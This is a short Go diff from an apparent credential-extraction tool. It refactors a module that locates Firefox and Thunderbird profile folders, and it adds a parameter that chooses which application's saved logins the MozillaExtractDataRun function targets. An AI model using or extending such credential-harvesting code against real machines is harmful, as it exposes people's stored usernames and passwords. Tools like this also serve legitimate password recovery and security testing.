@@ -19,13 +19,6 @@ import (
 	"strings"
 )
 
-var (
-	mozillaPathsUserData = []AppInfo{
-		{"FF", common.AppData + "\\Mozilla\\Firefox"},
-		{"TB", common.AppData + "\\Thunderbird"},
-	}
-)
-
 type AppInfo struct {
 	name string
 	path string
@@ -284,7 +277,16 @@ func mozillaModuleStart(data AppInfo) ([]common.UrlNamePass, bool) {
 	return nil, false
 }
 
-func MozillaExtractDataRun() common.ExtractCredentialsResult {
+func MozillaExtractDataRun(targetType string) common.ExtractCredentialsResult {
+
+	var mozillaPathsUserData []AppInfo
+
+	if targetType == "mail" {
+		mozillaPathsUserData = append(mozillaPathsUserData, AppInfo{"TB", common.AppData + "\\Thunderbird"})
+	} else {
+		mozillaPathsUserData = append(mozillaPathsUserData, AppInfo{"FF", common.AppData + "\\Mozilla\\Firefox"})
+	}
+
 	var Result common.ExtractCredentialsResult
 	var EmptyResult = common.ExtractCredentialsResult{false, Result.Data}
 
